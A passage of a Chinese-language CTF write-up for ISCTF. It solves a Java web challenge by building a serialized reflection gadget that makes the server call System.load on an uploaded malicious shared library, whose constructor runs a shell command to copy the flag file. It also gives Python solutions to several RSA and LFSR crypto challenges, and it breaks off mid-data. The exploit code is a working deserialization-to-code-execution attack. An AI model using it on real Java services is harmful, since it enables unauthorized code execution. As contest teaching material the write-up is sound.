    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependencyManagement</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependencies</span><span class="token punctuation">></span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>
                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>org.springframework.boot<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>
                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>spring-boot-dependencies<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>
                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>$&#123;spring-boot.version&#125;<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span>
                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>type</span><span class="token punctuation">></span></span>pom<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>type</span><span class="token punctuation">></span></span>
                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>scope</span><span class="token punctuation">></span></span>import<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>scope</span><span class="token punctuation">></span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependencies</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependencyManagement</span><span class="token punctuation">></span></span>

    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>build</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>plugins</span><span class="token punctuation">></span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>plugin</span><span class="token punctuation">></span></span>
                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>org.apache.maven.plugins<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>
                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>maven-compiler-plugin<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>
                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>3.8.1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span>
                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>configuration</span><span class="token punctuation">></span></span>
                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>source</span><span class="token punctuation">></span></span>1.8<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>source</span><span class="token punctuation">></span></span>
                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>target</span><span class="token punctuation">></span></span>1.8<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>target</span><span class="token punctuation">></span></span>
                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>encoding</span><span class="token punctuation">></span></span>UTF-8<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>encoding</span><span class="token punctuation">></span></span>
                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>configuration</span><span class="token punctuation">></span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>plugin</span><span class="token punctuation">></span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>plugin</span><span class="token punctuation">></span></span>
                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>org.apache.maven.plugins<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>
                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>maven-compiler-plugin<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>
                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>configuration</span><span class="token punctuation">></span></span>
                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>source</span><span class="token punctuation">></span></span>1.8<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>source</span><span class="token punctuation">></span></span>
                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>target</span><span class="token punctuation">></span></span>1.8<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>target</span><span class="token punctuation">></span></span>
                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>compilerArgs</span><span class="token punctuation">></span></span>
                        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>arg</span><span class="token punctuation">></span></span>-XDignore.symbol.file<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>arg</span><span class="token punctuation">></span></span>
                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>compilerArgs</span><span class="token punctuation">></span></span>
                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>fork</span><span class="token punctuation">></span></span>true<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>fork</span><span class="token punctuation">></span></span>
                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>configuration</span><span class="token punctuation">></span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>plugin</span><span class="token punctuation">></span></span>

            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>plugin</span><span class="token punctuation">></span></span>
                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>org.springframework.boot<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>
                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>spring-boot-maven-plugin<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>
                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>$&#123;spring-boot.version&#125;<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span>
                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>configuration</span><span class="token punctuation">></span></span>
                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>mainClass</span><span class="token punctuation">></span></span>com.example.start<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>mainClass</span><span class="token punctuation">></span></span>
                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>finalName</span><span class="token punctuation">></span></span>ezJava<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>finalName</span><span class="token punctuation">></span></span>
<span class="token comment">&lt;!--                    &lt;skip>true&lt;/skip>--></span>
                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>configuration</span><span class="token punctuation">></span></span>
                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>executions</span><span class="token punctuation">></span></span>
                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>execution</span><span class="token punctuation">></span></span>
                        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>id</span><span class="token punctuation">></span></span>repackage<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>id</span><span class="token punctuation">></span></span>
                        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>goals</span><span class="token punctuation">></span></span>
                            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>goal</span><span class="token punctuation">></span></span>repackage<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>goal</span><span class="token punctuation">></span></span>
                        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>goals</span><span class="token punctuation">></span></span>
                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>execution</span><span class="token punctuation">></span></span>
                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>executions</span><span class="token punctuation">></span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>plugin</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>plugins</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>build</span><span class="token punctuation">></span></span>

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>project</span><span class="token punctuation">></span></span>
</code></pre>

<p>依赖<br>不过给了个后门类</p>
<pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>example<span class="token punctuation">.</span>utile</span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">ObjectInputStream</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">Serializable</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">InvocationTargetException</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Method</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Arrays</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">HashMap</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">HashSet</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Set</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">YouFindThis</span> <span class="token keyword">implements</span> <span class="token class-name">Serializable</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">></span></span>aClass<span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token class-name">Class</span> argclass<span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token class-name">Object</span> input<span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token class-name">String</span> methed<span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token class-name">Object</span> args<span class="token punctuation">;</span>



    <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">readObject</span><span class="token punctuation">(</span><span class="token class-name">ObjectInputStream</span> ois<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span><span class="token punctuation">,</span> <span class="token class-name">ClassNotFoundException</span> <span class="token punctuation">&#123;</span>
        ois<span class="token punctuation">.</span><span class="token function">defaultReadObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">POFP</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token punctuation">&#125;</span>


    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">POFP</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>


        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token class-name">Function</span><span class="token punctuation">.</span><span class="token function">check_reef</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>aClass<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">SecurityException</span><span class="token punctuation">(</span><span class="token string">"You are not allowed to leave this class"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token class-name">Function</span><span class="token punctuation">.</span><span class="token function">check_reef</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>input<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">SecurityException</span><span class="token punctuation">(</span><span class="token string">"You are not allowed to leave this class"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token class-name">Function</span><span class="token punctuation">.</span><span class="token function">check_reef</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>methed<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">SecurityException</span><span class="token punctuation">(</span><span class="token string">"You are not allowed to leave this class"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>
            <span class="token class-name">Method</span> method <span class="token operator">=</span> aClass<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span>methed<span class="token punctuation">,</span>argclass<span class="token punctuation">)</span><span class="token punctuation">;</span>
            method<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            method<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>input<span class="token punctuation">,</span>args<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">NoSuchMethodException</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">RuntimeException</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">InvocationTargetException</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">RuntimeException</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IllegalAccessException</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">RuntimeException</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>

    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
</code></pre>
<p>可以实现任意方法调用，不过ban了一些RCE的方法不过这里可以使用<code>System.load</code>加载恶意so，正好也符合题目名字<code>load_jvav</code></p>
<p>1.先生成一个恶意so上传</p>
<pre class="language-c" data-language="c"><code class="language-c">include <span class="token operator">&lt;</span>stdlib<span class="token punctuation">.</span>h<span class="token operator">></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span>

<span class="token keyword">__attribute__</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>__constructor__<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">void</span> <span class="token function">preload</span> <span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"cat /flag/flag.flag > /tmp/aaa"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>

<pre class="language-none"><code class="language-none">gcc -shared -fPIC exp.c -o exp.so</code></pre>

<p>上传<br><img src="https://tuchuang-1322890938.cos.ap-shanghai.myqcloud.com/pictures/20251206205627.png" alt="image.png" loading="lazy"></p>
<p>然后生成恶意反序列化payload</p>
<pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>example</span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>example<span class="token punctuation">.</span>utile<span class="token punctuation">.</span></span><span class="token class-name">YouFindThis</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">ByteArrayOutputStream</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">ObjectOutputStream</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> exp <span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>
        <span class="token class-name">YouFindThis</span> gadget <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">YouFindThis</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        gadget<span class="token punctuation">.</span>aClass <span class="token operator">=</span> <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>System</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">;</span>
        gadget<span class="token punctuation">.</span>argclass <span class="token operator">=</span> <span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">;</span>
        gadget<span class="token punctuation">.</span>methed <span class="token operator">=</span> <span class="token string">"load"</span><span class="token punctuation">;</span>
        gadget<span class="token punctuation">.</span>args <span class="token operator">=</span> <span class="token string">"/tmp/exp.so"</span><span class="token punctuation">;</span>
        
        gadget<span class="token punctuation">.</span>input <span class="token operator">=</span> <span class="token string">"SafeString"</span><span class="token punctuation">;</span>
        
        <span class="token class-name">ByteArrayOutputStream</span> baos <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ByteArrayOutputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">ObjectOutputStream</span> oos <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectOutputStream</span><span class="token punctuation">(</span>baos<span class="token punctuation">)</span><span class="token punctuation">;</span>
        oos<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span>gadget<span class="token punctuation">)</span><span class="token punctuation">;</span>
        oos<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> payload <span class="token operator">=</span> baos<span class="token punctuation">.</span><span class="token function">toByteArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">String</span> base64Payload <span class="token operator">=</span> <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span>Base64</span><span class="token punctuation">.</span><span class="token function">getEncoder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">encodeToString</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>base64Payload<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span></code></pre>

<p>文件名加上<code>.ref</code>触发反序列化<br><img src="https://tuchuang-1322890938.cos.ap-shanghai.myqcloud.com/pictures/20251206205745.png" alt="image.png" loading="lazy"><br>然后读取flag即可<br><img src="https://tuchuang-1322890938.cos.ap-shanghai.myqcloud.com/pictures/20251206205756.png" alt="image.png" loading="lazy"></p>
<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="easy-RSA"><a href="#easy-RSA" class="headerlink" title="easy_RSA"></a>easy_RSA</h3><p>扩展欧几里得</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> long_to_bytes

<span class="token comment"># Given values</span>
N <span class="token operator">=</span> <span class="token number">17630258257080557797062320474423515967705950026415012912087655679315479168903980901728425140787005046038000068414269936806478828260848859753400786557270120330760791255046985114127285672634413513991988895166115794242018674042563788348381567565190146278040811257757119090296478610798393944581870309373529884950663990485525646200034220648901490835962964029936321155200390798215987316069871958913773199197073860062515329879288106446016695204426001393566351524023857332978260894409698596465474214898402707157933326431896629025197964209580991821222557663589475589423032130993456522178540455360695933336455068507071827928617</span>
ct1 <span class="token operator">=</span> <span class="token number">5961639119243884817956362325106436035547108981120248145301572089585639543543496627985540773185452108709958107818159430835510386993354596106366458898765597405461225798615020342640056386757104855709899089816838805631480329264128349465229327090721088394549641366346516133008681155817222994359616737681983784274513555455340301061302815102944083173679173923728968671113926376296481298323500774419099682647601977970777260084799036306508597807029122276595080580483336115458713338522372181732208078117809553781889555191883178157241590455408910096212697893247529197116309329028589569527960811338838624831855672463438531266455</span>
ct2 <span class="token operator">=</span> <span class="token number">11792054298654397865983651507912282632831471680334312509918945120797862876661899077559686851237832931501121869814783150387308320349940383857026679141830402807715397332316601439614741315278033853646418275632174160816784618982743834204997402866931295619202826633629690164429512723957241072421663170829944076753483616865208617479794763412611604625495201470161813033934476868949612651276104339747165276204945125001274777134529491152840672010010940034503257315555511274325831684793040209224816879778725612468542758777428888563266233284958660088175139114166433501743740034567850893745466521144371670962121062992082312948789</span>
e <span class="token operator">=</span> <span class="token number">65537</span>

<span class="token comment"># Function for Extended Euclidean Algorithm</span>
<span class="token keyword">def</span> <span class="token function">egcd</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> a <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token punctuation">(</span>b<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        g<span class="token punctuation">,</span> y<span class="token punctuation">,</span> x <span class="token operator">=</span> egcd<span class="token punctuation">(</span>b <span class="token operator">%</span> a<span class="token punctuation">,</span> a<span class="token punctuation">)</span>
        <span class="token keyword">return</span> <span class="token punctuation">(</span>g<span class="token punctuation">,</span> x <span class="token operator">-</span> <span class="token punctuation">(</span>b <span class="token operator">//</span> a<span class="token punctuation">)</span> <span class="token operator">*</span> y<span class="token punctuation">,</span> y<span class="token punctuation">)</span>

<span class="token comment"># The effective exponents are e and (N+1)</span>
exp1 <span class="token operator">=</span> e
exp2 <span class="token operator">=</span> N <span class="token operator">+</span> <span class="token number">1</span>

<span class="token comment"># Find coefficients u, v such that u*e + v*(N+1) = 1</span>
g<span class="token punctuation">,</span> u<span class="token punctuation">,</span> v <span class="token operator">=</span> egcd<span class="token punctuation">(</span>exp1<span class="token punctuation">,</span> exp2<span class="token punctuation">)</span>

<span class="token comment"># Recover message: m = ct1^u * ct2^v mod N</span>
<span class="token comment"># Python's pow(base, exp, mod) handles negative exponents by computing modular inverse</span>
m <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token builtin">pow</span><span class="token punctuation">(</span>ct1<span class="token punctuation">,</span> u<span class="token punctuation">,</span> N<span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>ct2<span class="token punctuation">,</span> v<span class="token punctuation">,</span> N<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">%</span> N

<span class="token keyword">print</span><span class="token punctuation">(</span>long_to_bytes<span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token comment">#ISCTF&#123;Congratulations_you_master_Mathematical_ability&#125;</span></code></pre>

<h3 id="Power-tower"><a href="#Power-tower" class="headerlink" title="Power tower"></a>Power tower</h3><p>n可以分解</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> long_to_bytes

t <span class="token operator">=</span> <span class="token number">6039738711082505929</span>
n <span class="token operator">=</span> <span class="token number">107502945843251244337535082460697583639357473016005252008262865481138355040617</span>
c <span class="token operator">=</span> <span class="token number">114092817888610184061306568177474033648737936326143099257250807529088213565247</span>

p <span class="token operator">=</span> <span class="token number">127</span>
q <span class="token operator">=</span> <span class="token number">841705194007</span>
r <span class="token operator">=</span> <span class="token number">1005672644717572752052474808610481144121914956393489966622615553</span>
phi <span class="token operator">=</span> <span class="token punctuation">(</span>p <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token punctuation">(</span>q <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token punctuation">(</span>r <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span>

E <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> t<span class="token punctuation">,</span> phi<span class="token punctuation">)</span> 
l <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> E<span class="token punctuation">,</span> n<span class="token punctuation">)</span>   

flag_int <span class="token operator">=</span> c <span class="token operator">^</span> l
flag <span class="token operator">=</span> long_to_bytes<span class="token punctuation">(</span>flag_int<span class="token punctuation">)</span>

<span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>
<span class="token comment">#ISCTF&#123;Euler_1s_v3ry|useful!!!!!&#125;</span></code></pre>

<h3 id="小蓝鲨的LFSR系统"><a href="#小蓝鲨的LFSR系统" class="headerlink" title="小蓝鲨的LFSR系统"></a>小蓝鲨的LFSR系统</h3><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> binascii

<span class="token comment"># 1. 数据准备</span>
initState <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token 